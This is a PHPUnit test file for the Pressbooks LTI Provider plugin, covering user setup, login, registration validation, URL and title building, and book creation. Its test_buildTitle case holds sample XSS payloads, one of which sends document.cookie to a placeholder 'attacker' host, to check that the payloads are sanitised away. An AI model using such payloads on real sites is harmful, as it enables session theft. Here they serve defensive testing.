<?php

class ToolTest extends \WP_UnitTestCase {

	use utilsTrait;

	/**
	 * @var \PressbooksLtiProvider\Tool
	 */
	protected $tool;

	/**
	 * @return \PressbooksLtiProvider\Admin
	 */
	protected function getMockAdmin() {

		$stub1 = $this
			->getMockBuilder( '\PressbooksLtiProvider\Admin' )
			->getMock();
		$stub1
			->method( 'getSettings' )
			->willReturn(
				[
					'whitelist' => "pressbooks.test\r\nnpressbooks.education\r\n",
					'prompt_for_authentication' => 0,
					'book_override' => 1,
					'admin_default' => 'subscriber',
					'staff_default' => 'subscriber',
					'learner_default' => 'subscriber',
					'hide_navigation' => 0,
				]
			);
		$stub1
			->method( 'getBookSettings' )
			->willReturn(
				[
					'admin_default' => 'subscriber',
					'staff_default' => 'subscriber',
					'learner_default' => 'subscriber',
					'hide_navigation' => 0,
				]
			);

		return $stub1;
	}

	/**
	 *
	 */
	public function set_up() {
		parent::set_up();
		$connector = PressbooksLtiProvider\Database::getConnector();
		$tool      = new PressbooksLtiProvider\Tool( $connector );
		$tool->setAdmin( $this->getMockAdmin() );
		$consumer       = new \IMSGlobal\LTI\ToolProvider\ToolConsumer( 'WP0-ZRTCXX', $connector );
		$tool->consumer = $consumer;
		$this->tool     = $tool;
	}

	public function test_getters_and_setters() {
		$this->tool->setAction( 'a' );
		$this->assertEquals( 'a', $this->tool->getAction() );
		$this->tool->setParams( [ 'b' ] );
		$this->assertEquals( [ 'b' ], $this->tool->getParams() );
	}

	public function test_relativeBookIconUrl() {
		$url = $this->tool->relativeBookIconUrl();
		$this->assertStringEndsWith( 'book.png', $url );
	}

	public function test_initSessionVars() {
		$this->tool->initSessionVars();
		$this->assertTrue( array_key_exists( 'pb_lti_return_url', $_SESSION ) );
	}

	public function test_setupUser() {
		$this->_book();
		$prefix = uniqid( 'test' );
		$email = "{$prefix}@pressbooks.test";
		$guid = rand();
		$user = new \IMSGlobal\LTI\ToolProvider\User();
		$user->ltiUserId = 1;
		$user->setEmail( $email );
		$user->roles = [ 'urn:lti:role:ims/lis/Administrator' ];
		$lti_id = "{$guid}|" . $user->getId();

		// User doesn't exist yet
		$this->assertFalse( $this->tool->matchUserById( $lti_id ) );

		$this->tool->setupUser( $user, $guid );
		$user = get_user_by( 'email', $email );
		$this->assertInstanceOf( '\WP_User', $user );
		$this->assertEquals( $prefix, $user->user_login );
		$this->assertTrue( is_user_member_of_blog( $user->ID ) );

		// User was created and linked
		$this->assertInstanceOf( '\WP_User', $this->tool->matchUserById( $lti_id ) );

		// Edge case, user exists in WP, no email (bad practice), consumer key determines scope
		$edge_user = '452475';
		wp_insert_user(
			[
				'user_login'    => $edge_user,
				'user_pass'     => wp_generate_password(),
				'user_nicename' => $edge_user,
				'first_name'    => 'FirstName',
				'last_name'     => 'LastName',
				'display_name'  => 'FirstName LastName',
			]
		);

		$test_insert = get_user_by( 'login', $edge_user );

		// User doesn't exist yet
		$this->assertInstanceOf( '\WP_User', $test_insert );

		$guid2                    = rand();
		$consumer_user            = new \IMSGlobal\LTI\ToolProvider\User();
		$consumer_user->ltiUserId = $edge_user;
		$consumer_user->setEmail( 'whatever@exmaple.org' );
		$consumer_user->roles = [ 'urn:lti:role:ims/lis/Instructor' ];
		$lti_id2              = "{$guid2}|" . $consumer_user->getId();

		// User doesn't exist yet
		$this->assertFalse( $this->tool->matchUserById( $lti_id2 ) );

		$this->tool->setupUser( $consumer_user, $guid2 );
		$user2 = get_user_by( 'login', $edge_user );
		$this->assertInstanceOf( '\WP_User', $user2 );
		$this->assertEquals( $edge_user, $user2->user_login );
		$this->assertTrue( is_user_member_of_blog( $user2->ID ) );

		// Existing user was recognized and linked
		$this->assertInstanceOf( '\WP_User', $this->tool->matchUserById( $lti_id2 ) );
	}

	public function test_authenticateUser() {
		$user = $this->factory()->user->create_and_get( [ 'role' => 'contributor' ] );
		$this->tool->authenticateUser( $user, '1:2:3', false, 'subscriber' );
		/** @var \PressbooksLtiProvider\Entities\Storage $storage */
		$storage = $_SESSION['pb_lti_prompt_for_authentication'];
		$this->assertEquals( $storage->user->ID, $user->ID );
		$this->assertEquals( $storage->user->nickname, $user->nickname );
		$this->assertEquals( $storage->ltiId, '1:2:3' );
		$this->assertEquals( $storage->ltiIdWasMatched, false );
		$this->assertEquals( $storage->role, 'subscriber' );
		unset( $_SESSION['pb_lti_prompt_for_authentication'] );
	}

	public function test_loginUser() {
		$user = $this->factory()->user->create_and_get( [ 'role' => 'contributor' ] );
		$this->assertEmpty( wp_get_current_user()->ID );

		// Login user, $lti_id_was_matched true (don't link account)
		$this->tool->loginUser( $user, '1:2:3', true, 'subscriber' );
		$this->assertEquals( wp_get_current_user()->ID, $user->ID );
		$this->assertEmpty( get_user_meta( $user->ID, \PressbooksLtiProvider\Tool::META_KEY ) );

		// Login user, $lti_id_was_matched false (link account)
		$this->tool->loginUser( $user, '1:2:3', false, 'subscriber' );
		$this->assertNotEmpty( wp_get_current_user()->ID, $user->ID );
	}

	public function test_setupDeepLink() {
		$this->_book();
		$this->tool->setParams( [ 'back-matter', 'appendix' ] );
		$this->tool->setupDeepLink();
		$this->assertStringContainsString( 'http', $this->tool->getRedirectUrl() );
	}

	public function test_renderContentItemForm() {
		$buffer = $this->tool->renderContentItemForm( 'https://pressbooks.test' );
		$this->assertStringContainsString( '</form>', $buffer );
	}

	public function test_renderRegisterForm() {
		$buffer = $this->tool->renderRegisterForm( 'https://pressbooks.test/yes', 'https://pressbooks.test/no' );
		$this->assertStringContainsString( '</html>', $buffer );
	}

	public function test_validateRegistrationRequest() {
		$this->assertTrue( $this->tool->validateRegistrationRequest() );

		$_POST['lti_message_type'] = 'ToolProxyRegistrationRequest';
		$this->assertFalse( $this->tool->validateRegistrationRequest() );

		$_POST['tc_profile_url'] = 'https://pressbooks.test/path/to/something';
		$this->assertTrue( $this->tool->validateRegistrationRequest() );

		$_POST['tc_profile_url'] = 'https://hotmail.com/path/to/something';
		$this->assertFalse( $this->tool->validateRegistrationRequest() );
	}

	public function test_maybeDisambiguateDomain() {
		$blog_id = $this->factory()->blog->create();
		$obj = get_blog_details( $blog_id );
		$disambiguate = $obj->siteurl;
		$subdomain_happy_path = 'https://biology201.example.com/';
		$subdirectory_happy_path = 'https://example.com/biol201';
		$empty_path = 'blort@example.com';

		$this->assertEquals( 'https://biology201.example.com', $this->tool->maybeDisambiguateDomain( $subdomain_happy_path ) );
		$this->assertEquals( 'https://example.com/biol201', $this->tool->maybeDisambiguateDomain( $subdirectory_happy_path ) );
		$this->assertEmpty( $this->tool->maybeDisambiguateDomain( $empty_path ) );
		$this->assertEquals( "{$disambiguate}1", $this->tool->maybeDisambiguateDomain( $disambiguate ) );
	}

	public function test_buildTitle() {
		$happy_path     = [ 'Course Name 657', '2352', 'Read this book!', '8932' ];
		$empty_path1    = [ '', '4321', '', '1234' ];
		$empty_path2    = [ 'BIO-201:microbiology', '4321', '', '1234' ];
		$markup_path    = [ '<b>Course Name 657</b>', '2352', '<span>Read this</span> book!', '8765' ];
		$malicious_path = [
			'<script>window.location=\'http://attacker/?cookie=\'+document.cookie</script>',
			'<script>var keyword = location.search.substring(6);document.querySelector("em").innerHTML=keyword;)</script>',
			'<script>bad.js</script>',
			'123',
		];
		$this->assertEquals( 'Course Name 657: Read this book!', $this->tool->buildTitle( $happy_path[0], $happy_path[1], $happy_path[2], $happy_path[3] ) );
		$this->assertEquals( 'Course ID 4321: Activity ID 1234', $this->tool->buildTitle( $empty_path1[0], $empty_path1[1], $empty_path1[2], $empty_path1[3] ) );
		$this->assertEquals( 'BIO-201:microbiology: Activity ID 1234', $this->tool->buildTitle( $empty_path2[0], $empty_path2[1], $empty_path2[2], $empty_path2[3] ) );
		$this->assertEquals( 'Course Name 657: Read this book!', $this->tool->buildTitle( $markup_path[0], $markup_path[1], $markup_path[2], $markup_path[3] ) );
		$this->assertEquals( 'Untitled', $this->tool->buildTitle( $malicious_path[0], $malicious_path[1], $malicious_path[2], $malicious_path[3] ) );
	}

	public function test_validateLtiBookExists() {
		$blog_id = $this->factory()->blog->create();
		$obj     = get_blog_details( $blog_id );
		$exists  = $obj->siteurl;

		update_option(
			$this->tool::CONSUMER_CONTEXT_KEY, [
				'resource_link_id' => 33,
				'context_id' => 2,
			]
		);

		$no_exist           = [ 'https://pressbooks.test/activityname', 33, 2 ];
		$no_url             = [ 'noHostHere', 33, 2 ];
		$different_resource = [ $exists, 34, 2 ];
		$different_course   = [ $exists, 33, 3 ];
		$happy_path         = [ $exists, 33, 2 ];

		$this->assertFalse( $this->tool->validateLtiBookExists( $no_exist[0], $no_exist[1], $no_exist[2] ) );
		$this->assertFalse( $this->tool->validateLtiBookExists( $no_url[0], $no_url[1], $no_url[2] ) );
		$this->assertFalse( $this->tool->validateLtiBookExists( $different_resource[0], $different_resource[1], $different_resource[2] ) );
		$this->assertFalse( $this->tool->validateLtiBookExists( $different_course[0], $different_course[1], $different_course[2] ) );
		$this->assertTrue( $this->tool->validateLtiBookExists( $happy_path[0], $happy_path[1], $happy_path[2] ) );

		delete_option( $this->tool::CONSUMER_CONTEXT_KEY );
		$this->tool->validateLtiBookExists( $happy_path[0], $happy_path[1], $happy_path[2] );
		$this->assertArrayHasKey( 'context_id', get_option( 'pressbooks_lti_consumer_context' ) );
	}

	public function test_buildAndValidateUrl() {
		$activity_title = '    <b>"my"</b> Moödle Äctivity ß    ';
		$too_short = 'abc';
		$no_characters  = '12345';
		$illegal = 'blog';
		$sub_directory_illegal = 'embed';

		$this->assertEquals( 'http://example.org/mymoodleactivitys/', $this->tool->buildAndValidateUrl( $activity_title ) );
		$this->assertEquals( 'http://example.org/abc1/', $this->tool->buildAndValidateUrl( $too_short ) );
		$this->assertEquals( 'http://example.org/12345a/', $this->tool->buildAndValidateUrl( $no_characters ) );
		$this->assertEquals( '', $this->tool->buildAndValidateUrl( $illegal ) );
		$this->assertEquals( '', $this->tool->buildAndValidateUrl( $sub_directory_illegal ) );
	}

	public function test_processRequest() {
		$params = [
			'hello' => 'world',
			'foo' => 'bar',
		];
		$this->tool->processRequest( $params );
		$this->assertTrue( array_key_exists( 'hello', $this->tool->getParams() ) );
		$_POST['lti_message_type'] = 'ToolProxyRegistrationRequest';
		$this->tool->processRequest( $params );
		$this->assertFalse( $this->tool->ok );
	}

	public function test_createNewBook() {
		$id = get_current_user_id();
		$happy_path = [ 'http://example.org/mymoodleactivity/', 'Course: My Moodle Activity', $id, '33', '12345' ];
		$maybe_book = $this->tool->createNewBook( $happy_path[0], $happy_path[1], $happy_path[2], $happy_path[3], $happy_path[4] );
		$this->assertInternalType( 'int', $maybe_book );

		$options = get_blog_option( $maybe_book, 'pressbooks_lti_consumer_context' );
		$this->assertEquals( '33', $options['resource_link_id'] );
		$this->assertEquals( '12345', $options['context_id'] );
	}
}
